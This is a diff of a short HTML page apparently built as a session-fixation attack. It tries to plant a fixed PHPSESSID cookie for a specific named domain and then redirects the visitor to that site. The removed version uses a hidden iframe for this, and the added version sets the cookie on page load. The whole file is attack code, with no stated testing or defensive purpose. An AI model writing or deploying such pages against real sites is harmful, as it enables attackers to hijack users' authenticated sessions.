@@ -1,34 +1,25 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Set Cookie</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Set Cookie Example</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set the cookie for the target domain
+            var cookieValue = 'PHPSESSID=ISOAH1234; domain=testing.celexhsrp.in; path=/';
+            document.cookie = cookieValue;
+
+            // Reload the page to apply the cookie
+            setTimeout(function() {
+                window.location.href = 'https://testing.celexhsrp.in/';
+            }, 5000); // 5-second delay before redirect
+        });
+    </script>
 </head>
 <body>
-    <script>
-        // Redirect to the target site
-        window.location.href = "https://testing.celexhsrp.in";
-        
-        // Function to set the cookie in the background
-        function setCookieInBackground() {
-            // Create a hidden iframe
-            var iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = "https://testing.celexhsrp.in";
-            document.body.appendChild(iframe);
-
-            // Set the cookie after the iframe loads
-            iframe.onload = function() {
-                // Set a delay to ensure the iframe has fully loaded
-                setTimeout(function() {
-                    iframe.contentWindow.document.cookie = "PHPSESSID=ISOAH1234; domain=testing.celexhsrp.in; path=/; SameSite=None; Secure";
-                    console.log("Cookie has been set in the background.");
-                }, 5000); // Wait for 5 seconds
-            };
-        }
-
-        // Execute the function after the page has loaded
-        window.onload = setCookieInBackground;
-    </script>
-    <p>If you are not redirected, click <a href="https://testing.celexhsrp.in">here</a>.</p>
+    <h1>Setting Cookie...</h1>
+    <p>This page will redirect in a few seconds.</p>
 </body>
 </html>
